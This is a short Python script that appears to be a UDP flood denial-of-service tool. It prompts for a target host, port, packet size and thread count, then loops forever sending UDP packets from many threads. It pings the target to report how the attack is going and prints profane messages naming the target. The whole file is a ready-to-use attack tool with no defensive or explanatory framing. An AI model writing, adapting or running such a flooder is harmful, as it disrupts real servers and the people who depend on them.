import threading
import socket
import random
import time
import ping3
from colorama import Fore as f
ip = input("ENTER TARGET URL >>> ")
print (f.RED+"TARGET URL"+f.WHITE+">>> "+ip)
target_ip = socket.gethostbyname(ip)
print (f.RED+"TARGET IP "+f.WHITE+">>> "+target_ip)
#print (target_ip)-
target_port = int(input("ENTER PORT >>> "))
print (f.RED+"TARGET PORT "+f.WHITE+">>> "+str(target_port))
packet_size = int(input("ENTER PACKET SIZE >>> "))
print (f.RED+"PACKET SIZE "+f.WHITE+">>> "+str(packet_size))
user_threads = int(input("ENTER THREADS >>> "))
print (f.RED+"THREADS "+f.WHITE+">>> "+str(user_threads))
for x in range(4):
    print ("attack starting in %s sec's" % x)
#global a
#a = 1
global threads
threads = []
def send_packet():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

#    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    source_ip = '.'.join([str(random.randint(0, 255)) for _ in range(4)])

    packet = b'\x00\x01\x02' * packet_size

    sock.sendto(packet, (target_ip, target_port))
    #a = str(a)
#    print ("/", flush=True, end="")
    try:
        response_time = ping3.ping(target_ip, unit='ms')
        print (f"fucking {ip} | ping {response_time} ms")
    except Exception as err:
        print (err)

while True:
#    threads = []
    for i in range(user_threads):
        t = threading.Thread(target=send_packet)
        t.start()
        threads.append(t)
    for thread in threads:
        thread.join()
#        print (threads)
#for i in range(1000):
 #       t = threading.Thread(target=send_packet)
  #      t.start()
   #     threads.append(t)
#for i in range(1000):
 #       t = threading.Thread(target=send_packet)
  #      t.start()
   #     threads.append(t)
#for i in range(100):
  #      t = threading.Thread(target=send_packet)
  #     t.start()
   #     threads.append(t)
